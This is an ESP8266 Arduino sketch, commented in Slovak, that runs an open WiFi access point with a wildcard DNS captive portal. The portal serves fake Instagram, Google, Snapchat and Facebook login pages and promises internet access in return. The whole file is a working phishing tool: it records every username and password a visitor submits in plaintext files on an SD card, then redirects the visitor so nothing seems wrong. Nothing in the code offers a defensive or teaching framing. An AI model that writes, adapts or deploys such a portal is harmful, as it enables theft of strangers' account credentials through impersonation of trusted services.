#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <SPI.h>
#include <SD.h>

#define SD_CS_PIN 15  // Prispôsob podľa zapojenia SD

const byte DNS_PORT = 53;
const char* ssid = "Test";

ESP8266WebServer server(80);
DNSServer dnsServer;

IPAddress apIP(192, 168, 4, 1);  // IP AP
const byte dnsPort = 53;

// Pomocná funkcia na ukladanie údajov do SD
void saveCredentials(const char* filename, String data) {
  File file = SD.open(filename, FILE_APPEND);
  if (file) {
    file.println(data);
    file.close();
  }
}

// Základný captive portal - presmerovanie všetkých stránok na index.html
void handleRoot() {
  String html = R"rawliteral(
<!DOCTYPE html>
<html lang="sk">
<head><meta charset="UTF-8"><title>Prihlásenie</title></head>
<body style="background:#121212; color:#e0e0e0; text-align:center;">
<h1>Pre získanie internetu vyberte spôsob prihlásenia</h1>
<a href="/instagram.html"><img src="/LoginIMAGES/instagram.jpg" style="width:300px;"></a><br>
<a href="/google.html"><img src="/LoginIMAGES/google.png" style="width:300px;"></a><br>
<a href="/snapchat.html"><img src="/LoginIMAGES/snapchat.jpg" style="width:300px;"></a><br>
<a href="/facebook.html"><img src="/LoginIMAGES/facebook.jpg" style="width:300px;"></a><br>
</body>
</html>)rawliteral";
  server.send(200, "text/html", html);
}

// Pomocná funkcia na zobrazenie prihlasovacej stránky pre danú službu
void handleLoginPage(const String& serviceName, const String& imageSrc) {
  String html = "<!DOCTYPE html><html lang=\"sk\"><head><meta charset=\"UTF-8\"><title>" + serviceName + " Prihlásenie</title></head><body style=\"background:#121212; color:#e0e0e0; text-align:center;\">";
  html += "<h1>" + serviceName + " Prihlásenie</h1>";
  html += "<img src=\"" + imageSrc + "\" style=\"width:200px; border-radius:10px;\"><br><br>";
  html += "<form method='POST' action='/" + serviceName + ".html'>";
  html += "Užívateľské meno:<br><input type='text' name='username'><br>";
  html += "Heslo:<br><input type='password' name='password'><br><br>";
  html += "<input type='submit' value='Prihlásiť sa'>";
  html += "</form>";
  html += "</body></html>";
  server.send(200, "text/html", html);
}

// Spracovanie POST pre prihlasovanie - uloží do súboru a zobrazí popup
void handleLoginPost(const String& serviceName) {
  if (server.method() != HTTP_POST) {
    server.send(405, "text/plain", "Method Not Allowed");
    return;
  }
  String username = server.arg("username");
  String password = server.arg("password");

  String dataToSave = "Username: " + username + ", Password: " + password;
  String filename = "/" + serviceName + "Creds.txt";
  saveCredentials(filename.c_str(), dataToSave);

  String response = R"rawliteral(
<html lang="sk"><head><meta charset="UTF-8"><title>Ukladanie</title>
<script>
window.onload = function() {
  alert("Počkajte prosím ...");
  window.location.href = "/";
}
</script>
</head><body></body></html>
)rawliteral";

  server.send(200, "text/html", response);
}

// Funkcie pre jednotlivé služby
void handleInstagram() {
  if (server.method() == HTTP_GET) {
    handleLoginPage("instagram", "/LoginIMAGES/instagram.jpg");
  } else if (server.method() == HTTP_POST) {
    handleLoginPost("instagram");
  }
}

void handleGoogle() {
  if (server.method() == HTTP_GET) {
    handleLoginPage("google", "/LoginIMAGES/google.png");
  } else if (server.method() == HTTP_POST) {
    handleLoginPost("google");
  }
}

void handleSnapchat() {
  if (server.method() == HTTP_GET) {
    handleLoginPage("snapchat", "/LoginIMAGES/snapchat.jpg");
  } else if (server.method() == HTTP_POST) {
    handleLoginPost("snapchat");
  }
}

void handleFacebook() {
  if (server.method() == HTTP_GET) {
    handleLoginPage("facebook", "/LoginIMAGES/facebook.jpg");
  } else if (server.method() == HTTP_POST) {
    handleLoginPost("facebook");
  }
}

// Jednoduché obslúženie obrázkov - treba ich uložiť na SPIFFS alebo SD, tu je len ukážka cesty
void handleImage() {
  String path = server.uri();
  if (SD.exists(path.c_str())) {
    File file = SD.open(path.c_str(), FILE_READ);
    if (file) {
      server.streamFile(file, "image/jpeg");
      file.close();
      return;
    }
  }
  server.send(404, "text/plain", "Image not found");
}

void setup() {
  Serial.begin(115200);

  // Inicializácia SD karty
  if (!SD.begin(SD_CS_PIN)) {
    Serial.println("Chyba pri inicializácii SD karty");
  } else {
    Serial.println("SD karta pripravená");
  }

  // Nastavenie WiFi AP
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid);

  Serial.print("WiFi AP IP: ");
  Serial.println(WiFi.softAPIP());

  // DNS server presmeruje všetky domény na IP AP
  dnsServer.start(DNS_PORT, "*", apIP);

  // HTTP server routovanie
  server.on("/", handleRoot);

  server.on("/instagram.html", HTTP_GET, handleInstagram);
  server.on("/instagram.html", HTTP_POST, handleInstagram);

  server.on("/google.html", HTTP_GET, handleGoogle);
  server.on("/google.html", HTTP_POST, handleGoogle);

  server.on("/snapchat.html", HTTP_GET, handleSnapchat);
  server.on("/snapchat.html", HTTP_POST, handleSnapchat);

  server.on("/facebook.html", HTTP_GET, handleFacebook);
  server.on("/facebook.html", HTTP_POST, handleFacebook);

  // Obrázky
  server.on("/LoginIMAGES/instagram.jpg", handleImage);
  server.on("/LoginIMAGES/google.png", handleImage);
  server.on("/LoginIMAGES/snapchat.jpg", handleImage);
  server.on("/LoginIMAGES/facebook.jpg", handleImage);

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
